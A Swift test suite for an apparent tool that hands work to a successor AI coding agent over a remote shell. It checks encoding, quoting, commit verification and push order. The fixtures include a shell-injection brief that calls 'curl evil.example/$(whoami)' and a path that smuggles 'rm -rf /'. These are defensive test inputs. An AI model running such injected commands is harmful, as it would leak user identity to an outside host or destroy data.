import Foundation
import Testing

@testable import LittleHerd

@Suite("Successor run")
struct SuccessorRunTests {
    /// A brief written by somebody else, punctuated to escape a shell if it
    /// were ever given the chance.
    private static let hostileBrief = """
        Fix the crash'; curl evil.example/$(whoami); echo '
        """

    private func steps(
        brief: String = hostileBrief,
        branch: String = "transfer/spike-1"
    ) -> [SuccessorRun.Step] {
        let plan = try? SuccessorLaunch.plan(
            briefPath: "Documentation/transfers/spike-1.md",
            briefText: brief,
            branch: branch,
            repository: "/Users/malpern/local-code/little-herd",
            scratchRoot: "/tmp/herd",
            provider: .claude,
            reportedAgentPath: "/Users/malpern/.local/bin/claude",
            expectedCommit: String(repeating: "a", count: 40)
        ).get()
        return SuccessorRun.steps(
            plan: plan!,
            repository: "/Users/malpern/local-code/little-herd",
            branch: branch,
            promptFile: "/tmp/herd/prompt",
            check: .xcode(scheme: "LittleHerd"),
            commitMessage: "Successor work"
        )
    }

    /// **The brief never reaches a command line, in any form.** This is the
    /// property the whole file exists for: the encoded prompt is inert, and a
    /// step containing the brief's own punctuation would mean it is being
    /// parsed by a shell on another machine.
    @Test
    func theBriefIsOnlyEverSentEncoded() throws {
        let commands = steps().map(\.command)
        for command in commands {
            #expect(!command.contains("curl evil.example"))
            #expect(!command.contains("$(whoami)"))
        }

        // And it is genuinely being carried rather than dropped: decode what
        // is actually on the wire and look inside it. Asserting on the
        // encoded text would only prove that some base64 is present.
        let staged = try #require(commands.first { $0.contains("base64 -d") })
        let payload = try #require(
            staged.split(separator: "'").first { $0.count > 40 }
        )
        let decoded = try #require(Data(base64Encoded: String(payload)))
        #expect(String(decoding: decoded, as: UTF8.self)
            .contains("curl evil.example"))
    }

    /// Break this by interpolating the prompt directly and the test above
    /// fails immediately — which is how we know it covers anything.
    @Test
    func theAgentReadsThePromptFromStdinRatherThanAnArgument() throws {
        let agent = steps().first { $0.purpose == .agent }
        let command = try #require(agent).command
        #expect(command.contains("cat '/tmp/herd/prompt' |"))
        // Measured on a real transfer: --disallowedTools is variadic and eats
        // a trailing prompt argument, so the prompt must not be one.
        #expect(!command.contains("$(cat"))
        #expect(command.hasSuffix("'WebSearch'"))
    }

    /// A failed check must not be followed by a push.
    @Test
    func nothingAfterAFailedCheckIsOptional() throws {
        let all = steps()
        let checkIndex = try #require(
            all.firstIndex { $0.purpose == .verification }
        )
        let pushIndex = try #require(
            all.firstIndex { $0.purpose == .delivery }
        )
        #expect(checkIndex < pushIndex)
        #expect(all[checkIndex].isFatal)
    }

    /// And a run that failed still has its worktree taken away.
    @Test
    func cleanupComesLastAndSurvivesFailure() throws {
        let all = steps()
        let last = try #require(all.last)
        #expect(last.purpose == .cleanup)
        #expect(!last.isFatal)
        #expect(last.command.contains("worktree remove"))
    }

    /// **What arrives over the network has to be what was sent.** The fetch
    /// is checked against the sha the source pushed before an agent reads a
    /// line of it, and the worktree is built from that sha rather than from
    /// FETCH_HEAD, so even a race between the two commands substitutes
    /// nothing.
    @Test
    func theFetchMustMatchTheCommitTheSourcePushed() throws {
        let worktree = try #require(
            steps().first { $0.purpose == .worktree }
        )
        let commit = String(repeating: "a", count: 40)
        #expect(worktree.command.contains("rev-parse FETCH_HEAD"))
        #expect(worktree.command.contains("= '\(commit)'"))
        #expect(worktree.command.contains("worktree add --detach"))
        // Built from the sha, never from the ref that was just checked.
        #expect(!worktree.command.hasSuffix("FETCH_HEAD"))
    }

    /// The push names the branch it was given and never takes whatever the
    /// destination's current branch happens to be.
    @Test
    func theOnlyPushIsToTheTransferBranch() throws {
        // The delivery commands are quoted argument-by-argument, so this looks
        // for the verb rather than a command line.
        let pushes = steps()
            .filter { $0.purpose == .delivery && $0.command.contains("push") }
        #expect(pushes.count == 1)
        #expect(
            try #require(pushes.first).command
                .contains("HEAD:refs/heads/transfer/spike-1")
        )
    }

    /// Every path crossing the boundary is quoted, including one that is doing
    /// its best not to be.
    @Test
    func awkwardPathsCannotEscapeTheirQuotes() {
        let quoted = RemoteShell.quoted("/tmp/it's here; rm -rf /")
        #expect(quoted == #"'/tmp/it'\''s here; rm -rf /'"#)
        // The dangerous characters survive as text rather than syntax.
        #expect(quoted.hasPrefix("'"))
        #expect(quoted.hasSuffix("'"))
    }
}
